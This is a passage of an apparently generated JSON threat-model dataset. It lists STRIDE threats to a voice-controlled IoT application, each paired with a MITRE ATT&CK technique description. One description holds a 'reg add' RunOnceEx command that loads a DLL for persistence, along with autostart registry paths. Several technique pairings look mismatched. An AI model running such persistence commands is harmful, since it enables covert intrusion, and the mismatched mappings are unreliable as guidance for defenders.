                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to the cloud storage containing user data and voice command history.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage is not secured.",
                    "Role": "Cloud Services",
                    "Condition": "If weak access controls are in place."
                },
                {
                    "Assumption": "Data is stored unencrypted.",
                    "Role": "Data Storage",
                    "Condition": "If data is not encrypted before being stored."
                },
                {
                    "Assumption": "System does not monitor access logs.",
                    "Role": "System Monitoring",
                    "Condition": "If access logs are ignored or incomplete."
                }
            ],
            "Potential Impact": "Compromise of user data and privacy.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "data access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An insider leaks confidential system configurations and sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Insiders have unrestricted access to sensitive configurations.",
                    "Role": "Access Control",
                    "Condition": "If access policies are lax."
                },
                {
                    "Assumption": "System configurations are not encrypted.",
                    "Role": "Configuration Management",
                    "Condition": "If sensitive data is stored in plaintext."
                },
                {
                    "Assumption": "There are no monitoring mechanisms for insider activities.",
                    "Role": "System Monitoring",
                    "Condition": "If insider actions are not logged or analyzed."
                }
            ],
            "Potential Impact": "Exposure of confidential operational details and potential system vulnerabilities.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "insider",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Data from Local System",
                "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.\n",
                "id": "attack-pattern--3c4a2599-71ee-4405-ba1e-0e28414b4bc5",
                "technique_id": "T1005"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker overwhelms the server-side application with a flood of requests, causing a service outage.",
            "Assumptions": [
                {
                    "Assumption": "Server lacks protection against high-volume traffic.",
                    "Role": "Server",
                    "Condition": "If rate limiting and throttling are not implemented."
                },
                {
                    "Assumption": "There is no redundant infrastructure.",
                    "Role": "Infrastructure",
                    "Condition": "If failover mechanisms are absent."
                },
                {
                    "Assumption": "Network traffic is not monitored.",
                    "Role": "Network Monitoring",
                    "Condition": "If abnormal traffic patterns are not detected."
                }
            ],
            "Potential Impact": "Service disruption affecting availability of voice-based interactions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "server",
                "flood"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker disables the IoT controller by sending malicious payloads.",
            "Assumptions": [
                {
                    "Assumption": "Controller does not validate incoming data.",
                    "Role": "IoT Controller",
                    "Condition": "If data validation checks are insufficient."
                },
                {
                    "Assumption": "Firmware is vulnerable to exploitation.",
                    "Role": "Firmware",
                    "Condition": "If the firmware has known vulnerabilities."
                },
                {
                    "Assumption": "There is no recovery mechanism in place.",
                    "Role": "System Resilience",
                    "Condition": "If controller lacks self-healing or reboot mechanisms."
                }
            ],
            "Potential Impact": "Inability to control IoT devices, leading to potential operational failures.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "IoT controller",
                "payload"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits vulnerabilities in the cloud services to cause a service outage.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services host critical application components.",
                    "Role": "Cloud Services",
                    "Condition": "If cloud is crucial for application operations."
                },
                {
                    "Assumption": "Cloud infrastructure has exploitable vulnerabilities.",
                    "Role": "Cloud Security",
                    "Condition": "If vulnerabilities are known and unpatched."
                },
                {
                    "Assumption": "There is no failover plan.",
                    "Role": "Disaster Recovery",
                    "Condition": "If alternate services or redundancy are not in place."
                }
            ],
            "Potential Impact": "Interruption of application functionality and data access.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "cloud",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to the IoT controller through a software vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Software vulnerabilities exist in the controller.",
                    "Role": "IoT Controller",
                    "Condition": "If unpatched vulnerabilities are present."
                },
                {
                    "Assumption": "Controller does not require multi-factor authentication.",
                    "Role": "Authentication",
                    "Condition": "If access control measures are weak."
                },
                {
                    "Assumption": "There is no activity tracking for administrative actions.",
                    "Role": "System Monitoring",
                    "Condition": "If log monitoring is inadequate."
                }
            ],
            "Potential Impact": "Full control over IoT devices with potential for significant operational impact.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrator",
                "vulnerabilities"
            ],
            "mitre_technique": {
                "name": "SID-History Injection",
                "description": "The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).\n\nAdversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).",
                "id": "attack-pattern--1df0326d-2fbc-4d08-a16b-48365f1e742d",
                "technique_id": "T1178"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses a compromised cloud account to escalate privileges within the application.",
            "Assumptions": [
                {
                    "Assumption": "Cloud accounts have excessive privileges.",
                    "Role": "Cloud Services",
                    "Condition": "If least privilege principle is not followed."
                },
                {
                    "Assumption": "Compromised accounts are not detected promptly.",
                    "Role": "Account Monitoring",
                    "Condition": "If there is no monitoring for abnormal account activity."
                },
                {
                    "Assumption": "Role-based access controls are not enforced.",
                    "Role": "Access Control",
                    "Condition": "If roles allow broad access instead of specific permissions."
                }
            ],
            "Potential Impact": "Access to sensitive data and system operations, potentially causing significant damage.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud",
                "account"
            ],
            "mitre_technique": {
                "name": "External Remote Services",
                "description": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)\n\nAccess to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)",
                "id": "attack-pattern--10d51417-ee35-4589-b1ff-b6df1c334e8d",
                "technique_id": "T1133"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits an insecure API endpoint to escalate privileges in the voice-based application.",
            "Assumptions": [
                {
                    "Assumption": "APIs are not securely designed.",
                    "Role": "API",
                    "Condition": "If APIs lack security best practices."
                },
                {
                    "Assumption": "Output from APIs is not sanitized.",
                    "Role": "Data Sanitization",
                    "Condition": "If API responses are not validated."
                },
                {
                    "Assumption": "There is no rate limiting for API requests.",
                    "Role": "API Security",
                    "Condition": "If excessive calls to APIs are not controlled."
                }
            ],
            "Potential Impact": "Unauthorized access and control over application components.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "API",
                "insecure endpoint"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "1",
    "batch_number": "9",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a legitimate user to issue voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to a recording or can mimic the user's voice",
                    "Role": "Attacker",
                    "Condition": "Voice-based authentication is not secure or absent."
                },
                {
                    "Assumption": "No multi-factor authentication mechanism",
                    "Role": "System",
                    "Condition": "Reliance solely on voice recognition."
                },
                {
                    "Assumption": "Access to microphone device or network transmission",
                    "Role": "Attacker",
                    "Condition": "Physical or network proximity to the system."
                }
            ],
            "Potential Impact": "Unauthorized commands executed.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "voice recognition",
                "impersonation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a fake server to capture voice commands.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can intercept or manipulate network traffic",
                    "Role": "Attacker",
                    "Condition": "Unencrypted communication channels."
                },
                {
                    "Assumption": "System lacks server authentication",
                    "Role": "System",
                    "Condition": "No validations on server-side endpoints."
                },
                {
                    "Assumption": "User unaware of security practices",
                    "Role": "User",
                    "Condition": "Lack of training on security awareness."
                }
            ],
            "Potential Impact": "Confidential data captured and used maliciously.",
            "MITRE ATT&CK Keywords": [
                "network interception",
                "man-in-the-middle",
                "voice command",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A compromised IoT controller issues commands appearing to originate from legitimate sources.",
            "Assumptions": [
                {
                    "Assumption": "IoT controller lacks robust authentication",
                    "Role": "System",
                    "Condition": "Weak or default security configurations."
                },
                {
                    "Assumption": "Remote access to IoT controller is possible",
                    "Role": "Attacker",
                    "Condition": "Insecure remote management interfaces."
                },
                {
                    "Assumption": "Device firmware not up-to-date",
                    "Role": "System",
                    "Condition": "Outdated firmware vulnerabilities."
                }
            ],
            "Potential Impact": "Unauthorized actions performed by IoT devices.",
            "MITRE ATT&CK Keywords": [
                "iot device",
                "controller compromise",
                "remote access",
                "spoofing"
            ],
            "mitre_technique": {
                "name": "Registry Run Keys / Startup Folder",
                "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. (Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in.\n\nThe startup folder path for the current user is:\n* <code>C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>\nThe startup folder path for all users is:\n* <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>\n\nThe following run keys are created by default on Windows systems:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nThe <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. (Citation: Microsoft RunOnceEx APR 2018) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code> and <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code> subkeys can automatically launch programs.\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run when any user logs on.\n\nBy default, the multistring BootExecute value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",
                "id": "attack-pattern--9422fc14-1c43-410d-ab0f-a709b76c72dc",
                "technique_id": "T1060"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters voice command data during transit.",
            "Assumptions": [
                {
                    "Assumption": "Unencrypted data transmission",
                    "Role": "System",
                    "Condition": "Use of unsecure communication protocols."
                },
                {
                    "Assumption": "Capability to intercept network traffic",
                    "Role": "Attacker",
                    "Condition": "Access to network communication paths."
                },
                {
                    "Assumption": "No integrity checking mechanisms",
                    "Role": "System",
                    "Condition": "Lack of hashing or similar verification methods."
                }
            ],
            "Potential Impact": "Integrity of commands compromised.",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "network modification",
                "command manipulation",
                "tampering"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for 